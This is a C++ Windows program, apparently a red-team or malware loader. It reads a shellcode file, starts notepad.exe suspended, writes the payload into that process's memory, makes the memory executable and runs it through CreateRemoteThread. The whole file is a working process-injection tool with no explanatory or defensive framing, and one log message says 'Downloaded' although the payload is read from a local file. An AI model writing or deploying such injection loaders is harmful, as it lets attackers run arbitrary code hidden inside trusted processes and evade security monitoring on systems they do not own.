#include <Windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <iterator>

std::vector<BYTE> ReadPayload(const char* path) {
    std::ifstream file(path, std::ios::binary);
    if (!file) return {};
    return std::vector<BYTE>(
        (std::istreambuf_iterator<char>(file)),
        std::istreambuf_iterator<char>()
    );
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Usage: createRemoteThread.exe <payload.bin>\n";
        return 1;
    }

    std::vector<BYTE> payload = ReadPayload(argv[1]);
    if (payload.empty()) {
        std::cerr << "[-] Failed to read payload\n";
        return 1;
    }
    std::cout << "[+] Downloaded " << payload.size() << " bytes\n";

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    char cmd[] = "C:\\Windows\\System32\\notepad.exe";
    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_SUSPENDED,
                        NULL, NULL, &si, &pi)) {
        std::cerr << "[-] CreateProcessA failed: " << GetLastError() << "\n";
        return 1;
    }
    HANDLE hProcess = pi.hProcess;
    std::cout << "[+] Created notepad.exe (PID: " << pi.dwProcessId << ")\n";

    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, payload.size(),
                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        std::cerr << "[-] VirtualAllocEx failed: " << GetLastError() << "\n";
        return 1;
    }
    std::cout << "[+] Allocated remote memory at: " << remoteMem << "\n";

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remoteMem, payload.data(),
                            payload.size(), &written)) {
        std::cerr << "[-] WriteProcessMemory failed: " << GetLastError() << "\n";
        return 1;
    }
    std::cout << "[+] Written " << written << " bytes\n";

    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, remoteMem, payload.size(),
                          PAGE_EXECUTE_READWRITE, &oldProtect)) {
        std::cerr << "[-] VirtualProtectEx failed: " << GetLastError() << "\n";
        return 1;
    }

    DWORD threadId = 0;
    HANDLE hRemoteThread = CreateRemoteThread(
        hProcess,
        NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteMem,
        NULL, 0,
        &threadId
    );
    if (!hRemoteThread) {
        std::cerr << "[-] CreateRemoteThread failed: " << GetLastError() << "\n";
        return 1;
    }
    std::cout << "[+] Remote thread created (ID: " << threadId << ")\n";

    WaitForSingleObject(hRemoteThread, INFINITE);
    CloseHandle(hRemoteThread);

    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}